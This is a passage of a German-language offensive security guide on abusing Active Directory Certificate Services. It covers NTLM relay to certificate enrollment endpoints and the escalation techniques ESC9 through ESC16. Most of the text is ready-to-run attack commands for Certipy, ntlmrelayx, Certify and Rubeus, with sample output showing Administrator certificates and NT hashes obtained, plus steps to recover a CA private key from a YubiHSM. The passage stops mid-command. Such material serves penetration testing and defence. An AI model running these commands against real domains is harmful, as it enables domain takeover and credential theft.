Ein häufiges **Problem** bei NTLM-Relay-Angriffen ist die **kurze Dauer von NTLM-Sitzungen** sowie die Unfähigkeit des Angreifers, mit Services zu interagieren, die **NTLM-Signing erfordern**.

Diese Einschränkung lässt sich jedoch überwinden, indem ein NTLM-Relay-Angriff ausgenutzt wird, um ein Zertifikat für den Benutzer zu erhalten, da die Gültigkeitsdauer des Zertifikats die Sitzungsdauer bestimmt und das Zertifikat mit Services verwendet werden kann, die **NTLM-Signing voraussetzen**. Anweisungen zur Verwendung eines gestohlenen Zertifikats findest du unter:


{{#ref}}
account-persistence.md
{{#endref}}

Eine weitere Einschränkung von NTLM-Relay-Angriffen besteht darin, dass **sich ein vom Angreifer kontrollierter Computer von einem Opferkonto authentifizieren lassen muss**. Der Angreifer könnte entweder warten oder versuchen, diese Authentifizierung zu **erzwingen**:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Missbrauch**

[**Certify**](https://github.com/GhostPack/Certify) listet **aktivierte HTTP-AD-CS-Endpunkte** auf:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Die Eigenschaft `msPKI-Enrollment-Servers` wird von Enterprise Certificate Authorities (CAs) verwendet, um Endpunkte des Certificate Enrollment Service (CES) zu speichern. Diese Endpunkte können mit dem Tool **Certutil.exe** geparst und aufgelistet werden:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Missbrauch mit Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Missbrauch mit [Certipy](https://github.com/ly4k/Certipy)

Die Zertifikatsanforderung wird von Certipy standardmäßig anhand des Templates `Machine` oder `User` gestellt, abhängig davon, ob der Name des weitergeleiteten Kontos mit `$` endet. Die Angabe eines alternativen Templates ist mithilfe des Parameters `-template` möglich.

Anschließend kann eine Technik wie [PetitPotam](https://github.com/ly4k/PetitPotam) verwendet werden, um eine Authentifizierung zu erzwingen. Bei Domänencontrollern muss `-template DomainController` angegeben werden.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Erklärung

Der neue Wert **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) für **`msPKI-Enrollment-Flag`**, bezeichnet als ESC9, verhindert das Einbetten der **neuen `szOID_NTDS_CA_SECURITY_EXT`-Sicherheitserweiterung** in ein Zertifikat. Dieses Flag wird relevant, wenn `StrongCertificateBindingEnforcement` auf `1` (die Standardeinstellung) gesetzt ist, im Gegensatz zu einer Einstellung von `2`. Seine Bedeutung nimmt in Szenarien zu, in denen ein schwächeres Certificate Mapping für Kerberos oder Schannel ausgenutzt werden könnte (wie bei ESC10), da das Fehlen von ESC9 die Anforderungen nicht ändern würde.<sup>[[7]](#references)</sup>

Die Bedingungen, unter denen die Einstellung dieses Flags relevant wird, umfassen:

- `StrongCertificateBindingEnforcement` ist nicht auf `2` angepasst (Standardwert ist `1`), oder `CertificateMappingMethods` enthält das `UPN`-Flag.
- Das Zertifikat ist innerhalb der `msPKI-Enrollment-Flag`-Einstellung mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` markiert.
- Das Zertifikat gibt eine beliebige Client-Authentifizierungs-EKU an.
- Für mindestens ein Konto sind `GenericWrite`-Berechtigungen verfügbar, um ein anderes Konto zu kompromittieren.

### Missbrauchsszenario

Angenommen, `John@corp.local` verfügt über `GenericWrite`-Berechtigungen für `Jane@corp.local`, mit dem Ziel, `Administrator@corp.local` zu kompromittieren. Das Zertifikat-Template `ESC9`, für dessen Enrollment `Jane@corp.local` berechtigt ist, ist in seiner `msPKI-Enrollment-Flag`-Einstellung mit dem Flag `CT_FLAG_NO_SECURITY_EXTENSION` konfiguriert.

Zunächst wird mithilfe von Shadow Credentials der Hash von `Jane` abgerufen, ermöglicht durch `John`s `GenericWrite`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Anschließend wird der `userPrincipalName` von `Jane` in `Administrator` geändert, wobei der Domänenteil `@corp.local` absichtlich weggelassen wird:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Diese Änderung verstößt nicht gegen die Einschränkungen, da `Administrator@corp.local` weiterhin als `userPrincipalName` von `Administrator` unterscheidbar bleibt.

Anschließend wird das als verwundbar gekennzeichnete `ESC9`-Zertifikattemplate als `Jane` angefordert:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Es wird festgestellt, dass der `userPrincipalName` des Zertifikats `Administrator` widerspiegelt, jedoch keine „object SID“ enthält.

Der `userPrincipalName` von `Jane` wird anschließend auf den ursprünglichen Wert `Jane@corp.local` zurückgesetzt:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Der Versuch, sich mit dem ausgestellten Zertifikat zu authentifizieren, liefert nun den NT-Hash von `Administrator@corp.local`. Der Befehl muss aufgrund der fehlenden Domänenspezifikation im Zertifikat `-domain <domain>` enthalten:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Schwache Zertifikatzuordnungen - ESC10

### Erklärung

Zwei Registrierungswerte auf dem Domain Controller werden von ESC10 angesprochen:

- Der Standardwert für `CertificateMappingMethods` unter `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` ist `0x18` (`0x8 | 0x10`), zuvor war er auf `0x1F` gesetzt.
- Die Standardeinstellung für `StrongCertificateBindingEnforcement` unter `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` ist `1`, zuvor war sie `0`.<sup>[[7]](#references)</sup>

**Fall 1**

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist.

**Fall 2**

Wenn `CertificateMappingMethods` das `UPN`-Bit (`0x4`) enthält.

### Missbrauchsfall 1

Wenn `StrongCertificateBindingEnforcement` auf `0` konfiguriert ist, kann ein Konto A mit `GenericWrite`-Berechtigungen ausgenutzt werden, um ein beliebiges Konto B zu kompromittieren.

Wenn ein Angreifer beispielsweise über `Jane@corp.local` `GenericWrite`-Berechtigungen besitzt, versucht er, `Administrator@corp.local` zu kompromittieren. Das Vorgehen entspricht ESC9, sodass jedes Certificate Template verwendet werden kann.

Zunächst wird der Hash von `Jane` mithilfe von Shadow Credentials abgerufen, wobei die `GenericWrite`-Berechtigung ausgenutzt wird.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Anschließend wird `userPrincipalName` von `Jane` in `Administrator` geändert, wobei der Teil `@corp.local` absichtlich weggelassen wird, um eine Constraint-Verletzung zu vermeiden.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Anschließend wird als `Jane` ein Zertifikat angefordert, das die Client-Authentifizierung ermöglicht, wobei die Standardvorlage `User` verwendet wird.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird anschließend auf seinen ursprünglichen Wert, `Jane@corp.local`, zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Die Authentifizierung mit dem erhaltenen Zertifikat liefert den NT-Hash von `Administrator@corp.local`. Aufgrund der fehlenden Domänendetails im Zertifikat muss die Domäne im Befehl angegeben werden.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Missbrauchsfall 2

Wenn `CertificateMappingMethods` das `UPN`-Bit-Flag (`0x4`) enthält, kann ein Konto A mit `GenericWrite`-Berechtigungen jedes Konto B kompromittieren, dem eine `userPrincipalName`-Eigenschaft fehlt, einschließlich Maschinenkonten und des integrierten Domänenadministrators `Administrator`.

Hier besteht das Ziel darin, `DC$@corp.local` zu kompromittieren, indem zunächst über Shadow Credentials der Hash von `Jane` erlangt und dabei `GenericWrite` genutzt wird.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Der `userPrincipalName` von `Jane` wird dann auf `DC$@corp.local` gesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ein Zertifikat für die Client-Authentifizierung wird als `Jane` mithilfe der standardmäßigen `User`-Vorlage angefordert.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Der `userPrincipalName` von `Jane` wird nach diesem Prozess auf seinen ursprünglichen Wert zurückgesetzt.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Zur Authentifizierung über Schannel wird Certipys Option `-ldap-shell` verwendet, was eine erfolgreiche Authentifizierung als `u:CORP\DC$` anzeigt.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Über die LDAP-Shell ermöglichen Befehle wie `set_rbcd` Angriffe mittels Resource-Based Constrained Delegation (RBCD), wodurch möglicherweise der Domain Controller kompromittiert werden kann.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Diese Schwachstelle betrifft auch alle Benutzerkonten, denen ein `userPrincipalName` fehlt oder bei denen dieser nicht mit dem `sAMAccountName` übereinstimmt. Das standardmäßige `Administrator@corp.local` ist aufgrund seiner erweiterten LDAP-Berechtigungen und des standardmäßig fehlenden `userPrincipalName` ein besonders lohnendes Ziel.

## Relaying NTLM to ICPR - ESC11

### Erklärung

Wenn der CA Server nicht mit `IF_ENFORCEENCRYPTICERTREQUEST` konfiguriert ist, können NTLM relay attacks ohne signing über den RPC service durchgeführt werden. [Referenz hier](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Du kannst `certipy` verwenden, um zu überprüfen, ob `Enforce Encryption for Requests` deaktiviert ist. In diesem Fall zeigt certipy `ESC11`-Schwachstellen an.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Missbrauchsszenario

Es muss ein Relay-Server eingerichtet werden:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Hinweis: Für Domain Controller müssen wir `-template` in DomainController angeben.

Oder unter Verwendung von [sploutchys Fork von impacket](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell-Zugriff auf die ADCS-CA mit YubiHSM – ESC12

### Erklärung

Administratoren können die Zertifizierungsstelle so einrichten, dass sie sie auf einem externen Gerät wie dem „Yubico YubiHSM2“ speichert.

Wenn ein USB-Gerät über einen USB-Anschluss mit dem CA-Server verbunden ist oder, falls der CA-Server eine virtuelle Maschine ist, ein USB-Device-Server verwendet wird, ist ein Authentifizierungsschlüssel (manchmal auch als „Passwort“ bezeichnet) erforderlich, damit der Key Storage Provider Schlüssel im YubiHSM generieren und verwenden kann.

Dieser Schlüssel bzw. dieses Passwort wird in der Registry unter `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` im Klartext gespeichert.

Referenz [hier](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse-Szenario

Wenn der private Schlüssel der CA auf einem physischen USB-Gerät gespeichert ist und du Shell-Zugriff erhalten hast, ist es möglich, den Schlüssel wiederherzustellen.

Zuerst musst du das CA-Zertifikat abrufen (dieses ist öffentlich) und anschließend:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Verwenden Sie schließlich den certutil-Befehl `-sign`, um mithilfe des CA-Zertifikats und dessen privatem Schlüssel ein neues beliebiges Zertifikat zu fälschen.

## OID Group Link Abuse - ESC13

### Erklärung

Das Attribut `msPKI-Certificate-Policy` ermöglicht das Hinzufügen der Ausstellungsrichtlinie zur Zertifikatvorlage. Die für die Ausstellung von Richtlinien zuständigen `msPKI-Enterprise-Oid`-Objekte können im Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) des PKI-OID-Containers gefunden werden. Mithilfe des Attributs `msDS-OIDToGroupLink` dieses Objekts kann eine Richtlinie mit einer AD-Gruppe verknüpft werden. Dadurch kann ein System einen Benutzer, der das Zertifikat vorlegt, so autorisieren, als wäre er Mitglied der Gruppe. [Referenz hier](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Mit anderen Worten: Wenn ein Benutzer die Berechtigung hat, ein Zertifikat auszustellen, und das Zertifikat mit einer OID-Gruppe verknüpft ist, kann der Benutzer die Berechtigungen dieser Gruppe erben.

Verwenden Sie [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1), um OIDToGroupLink zu finden:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Abuse Scenario

Finde eine Benutzerberechtigung, die mit `certipy find` oder `Certify.exe find /showAllPermissions` verwendet werden kann.

Wenn `John` die Berechtigung hat, sich für `VulnerableTemplate` zu registrieren, kann der Benutzer die Berechtigungen der Gruppe `VulnerableGroup` erben.

Dazu muss er lediglich die Vorlage angeben. Er erhält ein Zertifikat mit `OIDToGroupLink`-Rechten.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Vulnerable Certificate Renewal Configuration- ESC14

### Erklärung

Die Beschreibung unter https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping ist bemerkenswert umfassend. Nachfolgend wird der Originaltext zitiert.<sup>[[14]](#references)</sup>

ESC14 befasst sich mit Schwachstellen, die durch „weak explicit certificate mapping“ entstehen, hauptsächlich durch den Missbrauch oder die unsichere Konfiguration des Attributs `altSecurityIdentities` bei Active Directory-Benutzer- oder Computerkonten. Dieses mehrwertige Attribut ermöglicht es Administratoren, X.509-Zertifikate manuell zu einem AD-Konto für Authentifizierungszwecke zuzuordnen. Wenn dieses Attribut befüllt ist, können diese expliziten Zuordnungen die standardmäßige Certificate-Mapping-Logik überschreiben, die sich typischerweise auf UPNs oder DNS-Namen im SAN des Zertifikats oder auf die in der Sicherheits-Erweiterung `szOID_NTDS_CA_SECURITY_EXT` eingebettete SID stützt.

Eine Zuordnung ist „schwach“, wenn der String-Wert im Attribut `altSecurityIdentities`, der zur Identifizierung eines Zertifikats verwendet wird, zu allgemein oder leicht erratbar ist, auf nicht eindeutigen Zertifikatsfeldern basiert oder leicht fälschbare Zertifikatsbestandteile verwendet. Wenn ein Angreifer ein Zertifikat erhalten oder erstellen kann, dessen Attribute einer solchen schwach definierten expliziten Zuordnung für ein privilegiertes Konto entsprechen, kann er dieses Zertifikat verwenden, um sich als dieses Konto zu authentifizieren und es zu impersonieren.

Beispiele für potenziell schwache `altSecurityIdentities`-Zuordnungs-Strings sind:

- Ausschließliche Zuordnung über einen allgemeinen Subject Common Name (CN): z. B. `X509:<S>CN=SomeUser`. Ein Angreifer könnte möglicherweise ein Zertifikat mit diesem CN aus einer weniger sicheren Quelle erhalten.
- Verwendung übermäßig allgemeiner Issuer Distinguished Names (DNs) oder Subject DNs ohne zusätzliche Eingrenzung, etwa durch eine bestimmte Seriennummer oder einen Subject Key Identifier: z. B. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Verwendung anderer vorhersehbarer Muster oder nicht kryptografischer Identifikatoren, die ein Angreifer möglicherweise in einem Zertifikat erfüllen kann, das er rechtmäßig erhalten oder fälschen kann (wenn er eine CA kompromittiert oder ein verwundbares Template wie bei ESC1 gefunden hat).

Das Attribut `altSecurityIdentities` unterstützt verschiedene Formate für Zuordnungen, darunter:

- `X509:<I>IssuerDN<S>SubjectDN` (Zuordnung über den vollständigen Issuer- und Subject-DN)
- `X509:<SKI>SubjectKeyIdentifier` (Zuordnung über den Wert der Subject-Key-Identifier-Erweiterung des Zertifikats)
- `X509:<SR>SerialNumberBackedByIssuerDN` (Zuordnung über die Seriennummer, implizit durch den Issuer-DN qualifiziert) – dies ist kein Standardformat, üblicherweise wird `<I>IssuerDN<SR>SerialNumber` verwendet.
- `X509:<RFC822>EmailAddress` (Zuordnung über einen RFC822-Namen, typischerweise eine E-Mail-Adresse, aus dem SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (Zuordnung über einen SHA1-Hash des Raw Public Key des Zertifikats – im Allgemeinen stark)

Die Sicherheit dieser Zuordnungen hängt stark von der Spezifität, Eindeutigkeit und kryptografischen Stärke der ausgewählten Zertifikatsidentifikatoren ab, die im Zuordnungs-String verwendet werden. Selbst wenn auf Domain Controllern starke Certificate-Binding-Modi aktiviert sind (die hauptsächlich implizite Zuordnungen auf Grundlage von SAN-UPNs/DNS und der SID-Erweiterung betreffen), kann ein fehlerhaft konfigurierter `altSecurityIdentities`-Eintrag weiterhin einen direkten Weg zur Impersonation darstellen, wenn die Zuordnungslogik selbst fehlerhaft oder zu großzügig ist.

### Missbrauchsszenario

ESC14 zielt auf **explizite Certificate Mappings** in Active Directory (AD), insbesondere auf das Attribut `altSecurityIdentities`. Wenn dieses Attribut gesetzt ist (absichtlich oder aufgrund einer Fehlkonfiguration), können Angreifer Konten impersonieren, indem sie Zertifikate vorlegen, die der Zuordnung entsprechen.

#### Szenario A: Angreifer kann in `altSecurityIdentities` schreiben

**Voraussetzung**: Der Angreifer verfügt über Schreibberechtigungen für das Attribut `altSecurityIdentities` des Zielkontos oder über die Berechtigung, diese in Form einer der folgenden Berechtigungen für das Ziel-AD-Objekt zu gewähren:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.

#### Szenario B: Ziel verfügt über eine schwache Zuordnung via X509RFC822 (E-Mail)

- **Voraussetzung**: Das Ziel verfügt über eine schwache X509RFC822-Zuordnung in `altSecurityIdentities`. Ein Angreifer kann das mail-Attribut des Opfers so setzen, dass es dem X509RFC822-Namen des Ziels entspricht, sich als Opfer ein Zertifikat ausstellen lassen und dieses verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario C: Ziel verfügt über eine X509IssuerSubject-Zuordnung

- **Voraussetzung**: Das Ziel verfügt über eine schwache explizite X509IssuerSubject-Zuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509IssuerSubject-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer sich als Opfer ein Zertifikat ausstellen lassen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

#### Szenario D: Ziel verfügt über eine X509SubjectOnly-Zuordnung

- **Voraussetzung**: Das Ziel verfügt über eine schwache explizite X509SubjectOnly-Zuordnung in `altSecurityIdentities`. Der Angreifer kann das Attribut `cn` oder `dNSHostName` eines Opfer-Principals so setzen, dass es dem Subject der X509SubjectOnly-Zuordnung des Ziels entspricht. Anschließend kann der Angreifer sich als Opfer ein Zertifikat ausstellen lassen und dieses Zertifikat verwenden, um sich als das Ziel zu authentifizieren.

### Konkrete Vorgänge
#### Szenario A

Ein Zertifikat des Zertifikat-Templates `Machine` anfordern
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Zertifikat speichern und konvertieren
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Authentifizieren (unter Verwendung des Zertifikats)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Bereinigung (optional)
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Für spezifischere Angriffsmethoden in verschiedenen Angriffsszenarien siehe bitte: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Erklärung

Die Beschreibung unter https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc ist bemerkenswert ausführlich. Nachfolgend ein Zitat aus dem Originaltext.<sup>[[15]](#references)</sup>

Mithilfe integrierter standardmäßiger Zertifikatvorlagen der Version 1 kann ein Angreifer eine CSR so erstellen, dass sie Application Policies enthält, die gegenüber den in der Vorlage konfigurierten Extended-Key-Usage-Attributen bevorzugt werden. Die einzige Voraussetzung sind Enrollment-Rechte. Damit können Client-Authentifizierungs-, Certificate-Request-Agent- und Code-Signing-Zertifikate mithilfe der Vorlage **_WebServer_** generiert werden.

### Missbrauch

Die [Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) enthält detailliertere Anwendungsbeispiele.<sup>[[14]](#references)</sup>


Der `find`-Befehl von Certipy kann dabei helfen, V1-Vorlagen zu identifizieren, die potenziell für ESC15 anfällig sind, wenn die CA nicht gepatcht wurde.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Szenario A: Direkte Impersonation über Schannel

**Schritt 1: Ein Zertifikat anfordern und dabei die Application Policy „Client Authentication“ sowie die Ziel-UPN einschleusen.** Der Angreifer `attacker@corp.local` zielt mithilfe des V1-Templates „WebServer“ (das vom Enrollee bereitgestellte Subjekt zulässt) auf `administrator@corp.local`.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Das anfällige V1-Template mit "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Fügt die OID `1.3.6.1.5.5.7.3.2` in die Application-Policies-Erweiterung des CSR ein.
- `-upn 'administrator@corp.local'`: Legt den UPN im SAN zur Identitätsvortäuschung fest.

**Schritt 2: Über Schannel (LDAPS) mit dem erhaltenen Zertifikat authentifizieren.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```
#### Szenario B: PKINIT/Kerberos Impersonation via Enrollment Agent Abuse

**Schritt 1: Ein Zertifikat von einem V1-Template anfordern (mit „Enrollee supplies subject“) und dabei die Application Policy „Certificate Request Agent“ injizieren.** Dieses Zertifikat ist für den Angreifer (`attacker@corp.local`) bestimmt, damit er zu einem Enrollment Agent wird. Für die eigene Identität des Angreifers wird hier kein UPN angegeben, da das Ziel die Agent-Funktionalität ist.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-application-policies 'Certificate Request Agent'
```
- `-application-policies 'Certificate Request Agent'`: Injiziert die OID `1.3.6.1.4.1.311.20.2.1`.

**Schritt 2: Verwende das „agent“-Zertifikat, um im Namen eines privilegierten Zielbenutzers ein Zertifikat anzufordern.** Dies ist ein ESC3-ähnlicher Schritt, bei dem das Zertifikat aus Schritt 1 als Agent-Zertifikat verwendet wird.
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'User' \
-pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```
**Schritt 3: Authentifizieren Sie sich als privilegierter Benutzer mithilfe des „on-behalf-of“-Zertifikats.**
```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
## Security Extension auf der CA deaktiviert (global) – ESC16

### Erklärung

**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** bezeichnet das Szenario, in dem ein Angreifer Folgendes ausnutzen kann, wenn die Konfiguration von AD CS die Einbindung der **szOID_NTDS_CA_SECURITY_EXT**-Extension in alle Zertifikate nicht erzwingt:

1. Ein Zertifikat **ohne SID binding** anfordern.

2. Dieses Zertifikat **zur Authentifizierung als beliebiges Konto** verwenden, beispielsweise zur Imitation eines Kontos mit hohen Berechtigungen (z. B. eines Domain Administrators).

Weitere Informationen zum detaillierten Prinzip findest du in [diesem Artikel](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)<sup>[[16]](#references)</sup>.

### Abuse

Das Folgende bezieht sich auf [diesen Link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Klicke hier, um detailliertere Anwendungsmethoden anzuzeigen.<sup>[[14]](#references)</sup>

Um festzustellen, ob die Umgebung von Active Directory Certificate Services (AD CS) für **ESC16** anfällig ist
```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```
**Schritt 1: Ursprüngliche UPN des Opferkontos auslesen (optional – zur Wiederherstellung).**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -user 'victim' \
read
```
**Schritt 2: Aktualisiere den UPN des Opferkontos auf den `sAMAccountName` des Zieladministrators.**
```bash
certipy account \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -upn 'administrator' \
-user 'victim' update
```
**Schritt 3: (Falls erforderlich) Zugangsdaten für das „victim“-Konto beschaffen (z. B. über Shadow Credentials).**
```shell
certipy shadow \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -account 'victim' \
auto
```
**Schritt 4: Fordere als der Benutzer „victim“ ein Zertifikat von _jedem geeigneten Client-Authentifizierungstemplate_ (z. B. „User“) auf der für ESC16 anfälligen CA an.** Da die CA für ESC16 anfällig ist, lässt sie die SID-Sicherheitserweiterung im ausgestellten Zertifikat automatisch weg, unabhängig von den spezifischen Einstellungen des Templates für diese Erweiterung. Setze die Umgebungsvariable für den Kerberos-Credential-Cache (Shell-Befehl):
```bash
export KRB5CCNAME=victim.ccache
```
Fordere dann das Zertifikat an:
```bash
certipy req \
-k -dc-ip '10.0.0.100' \
